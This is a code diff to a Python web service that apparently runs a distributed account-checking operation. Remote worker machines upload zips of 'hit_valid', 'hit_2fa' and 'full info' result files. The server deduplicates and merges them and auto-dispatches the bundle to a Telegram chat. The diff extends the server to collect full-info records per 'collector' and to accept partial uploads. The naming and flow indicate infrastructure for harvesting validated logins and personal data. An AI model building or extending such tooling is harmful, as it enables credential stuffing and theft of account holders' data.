@@ -289,7 +289,15 @@ def _bearer_token(auth_header: str | None) -> str:
     return ""
 
 
-_OUTPUT_RESULT_FILES = ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt")
+_OUTPUT_RESULT_FILES = ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt", "full_info_upas_valid.txt")
+_SAFE_COLLECTOR_TXT_RE = re.compile(r"^full_info_by_collector/[A-Za-z0-9._-]{1,64}\.txt$")
+
+
+def _is_allowed_output_entry(name: str) -> bool:
+    norm = (name or "").replace("\\", "/")
+    if norm != name or ".." in norm or norm.startswith("/"):
+        return False
+    return norm in _OUTPUT_RESULT_FILES or bool(_SAFE_COLLECTOR_TXT_RE.match(norm))
 
 
 _MAX_ZIP_UPLOAD_BYTES = 25 * 1024 * 1024
@@ -297,15 +305,14 @@ _MAX_ZIP_ENTRY_BYTES = 50 * 1024 * 1024
 _MAX_ZIP_TOTAL_UNCOMPRESSED = 100 * 1024 * 1024
 
 
-def _validate_and_read_output_zip(raw: bytes) -> dict[str, list[str]]:
+def _validate_and_read_output_zip(raw: bytes) -> dict[str, str]:
     if len(raw) > _MAX_ZIP_UPLOAD_BYTES:
         raise ValueError(f"Output zip too large (>{_MAX_ZIP_UPLOAD_BYTES} bytes)")
-    parsed: dict[str, list[str]] = {}
+    parsed: dict[str, str] = {}
     total_uncompressed = 0
     with zipfile.ZipFile(io.BytesIO(raw), "r") as zf:
         for info in zf.infolist():
-            b = os.path.basename(info.filename)
-            if info.filename != b or b not in _OUTPUT_RESULT_FILES:
+            if not _is_allowed_output_entry(info.filename):
                 raise ValueError(f"Disallowed entry in output zip: {info.filename}")
             if info.file_size > _MAX_ZIP_ENTRY_BYTES:
                 raise ValueError(f"Zip entry too large: {info.filename}")
@@ -326,8 +333,7 @@ def _validate_and_read_output_zip(raw: bytes) -> dict[str, list[str]]:
                     if read_so_far > _MAX_ZIP_ENTRY_BYTES or total_read > _MAX_ZIP_TOTAL_UNCOMPRESSED:
                         raise ValueError(f"Zip bomb detected in {info.filename}")
                     chunks.append(blk)
-            lines = [ln.strip() for ln in b"".join(chunks).decode("utf-8", errors="ignore").splitlines() if ln.strip()]
-            parsed[info.filename] = lines
+            parsed[info.filename] = b"".join(chunks).decode("utf-8", errors="ignore")
     return parsed
 
 
@@ -622,6 +628,16 @@ def create_app(
         await asyncio.to_thread(_annotate)
         return {"jobs": jobs, "tg_configured": bool(resolved_tg_tok and resolved_tg_chat)}
 
+    _CARD_SEP = "-" * 60
+
+    def _split_full_cards(text: str) -> list[str]:
+        out: list[str] = []
+        for blk in text.split(_CARD_SEP):
+            b = blk.strip()
+            if b:
+                out.append(b)
+        return out
+
     def _assemble_result_zip_sync(
         zip_name: str,
         summary_lines: list[str],
@@ -629,7 +645,9 @@ def create_app(
         otp_rows: list[dict],
         zip_paths: list[str],
     ) -> tuple[str, bytes, dict]:
-        merged: dict[str, list[str]] = {fn: [] for fn in _OUTPUT_RESULT_FILES}
+        merged: dict[str, list[str]] = {fn: [] for fn in ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt")}
+        merged_cards: dict[str, list[str]] = {}
+        seen_cards: dict[str, set[str]] = {}
         seen_valid: set[str] = set()
         seen_otp: set[str] = set()
         for row in valid_rows:
@@ -649,25 +667,38 @@ def create_app(
             try:
                 with open(zpath, "rb") as f:
                     parsed = _validate_and_read_output_zip(f.read())
-                for base_name, lines in parsed.items():
-                    for s in lines:
-                        if base_name == "hit_valid.txt":
+                for entry_name, raw_text in parsed.items():
+                    if entry_name == "full_info_upas_valid.txt" or entry_name.startswith("full_info_by_collector/"):
+                        bucket_list = merged_cards.setdefault(entry_name, [])
+                        bucket_seen = seen_cards.setdefault(entry_name, set())
+                        for card in _split_full_cards(raw_text):
+                            if card not in bucket_seen:
+                                bucket_seen.add(card)
+                                bucket_list.append(card)
+                        continue
+                    for ln in raw_text.splitlines():
+                        s = ln.strip()
+                        if not s:
+                            continue
+                        if entry_name == "hit_valid.txt":
                             if s in seen_valid:
                                 continue
                             seen_valid.add(s)
-                        elif base_name == "hit_2fa.txt":
+                        elif entry_name == "hit_2fa.txt":
                             if s in seen_otp:
                                 continue
                             seen_otp.add(s)
-                        merged[base_name].append(s)
+                        merged[entry_name].append(s)
             except Exception:
                 continue
 
         counts = {fn: len(lines) for fn, lines in merged.items()}
+        full_count = len(merged_cards.get("full_info_upas_valid.txt") or [])
         summary_txt = "\n".join(
             [
                 *summary_lines,
                 f"Valid    : {counts['hit_valid.txt']}",
+                f"Full Info: {full_count}",
                 f"2FA/OTP  : {counts['hit_2fa.txt']}",
                 f"Invalid  : {counts['invalid.txt']}",
                 f"Error    : {counts['err.txt']}",
@@ -676,9 +707,14 @@ def create_app(
         buf = io.BytesIO()
         with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
             zf.writestr("summary.txt", summary_txt.encode("utf-8"))
-            for fn in _OUTPUT_RESULT_FILES:
+            for fn in ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt"):
                 if merged[fn]:
                     zf.writestr(fn, ("\n".join(merged[fn]) + "\n").encode("utf-8"))
+            for entry_name in sorted(merged_cards.keys()):
+                cards = merged_cards[entry_name]
+                if cards:
+                    body = f"\n\n{_CARD_SEP}\n\n".join(cards) + f"\n\n{_CARD_SEP}\n"
+                    zf.writestr(entry_name, body.encode("utf-8"))
         return zip_name, buf.getvalue(), counts
 
     async def _build_job_zip(job_id: str) -> tuple[str, bytes, dict]:
@@ -885,7 +921,12 @@ def create_app(
         return {"ok": True, "inserted": inserted, "received": received}
 
     @app.post("/api/v1/agent/output/{job_id}")
-    async def upload_agent_output(job_id: str, request: Request, vps_id: str = Depends(require_agent_auth)):
+    async def upload_agent_output(
+        job_id: str,
+        request: Request,
+        partial: int = Query(default=0),
+        vps_id: str = Depends(require_agent_auth),
+    ):
         jid = _validate_safe_id(job_id, "job_id")
         job = await db.get_job(jid)
         if jid.startswith("manual_") and (not job or not (job.get("config") or {}).get("vps_ids")):
@@ -923,7 +964,10 @@ def create_app(
                 with open(ztmp, "wb") as f:
                     f.write(raw)
                 os.replace(ztmp, zdst)
-                done = {fn[:-4] for fn in os.listdir(odir) if fn.endswith(".zip")}
+                if not partial:
+                    with open(os.path.join(odir, f"{vps_id}.done"), "w", encoding="utf-8") as fd:
+                        fd.write("1")
+                done = {fn[:-5] for fn in os.listdir(odir) if fn.endswith(".done")}
                 sent = os.path.isfile(os.path.join(jdir, ".tg_sent"))
                 return done, sent
 
@@ -931,7 +975,7 @@ def create_app(
             await db.touch_seen(vps_id)
 
             tg_auto_sent = False
-            if expected and expected.issubset(done_vps) and resolved_tg_tok and resolved_tg_chat and not already_sent:
+            if not partial and expected and expected.issubset(done_vps) and resolved_tg_tok and resolved_tg_chat and not already_sent:
                 with contextlib.suppress(Exception):
                     await _dispatch_job_tg_zip(jid)
                     tg_auto_sent = True
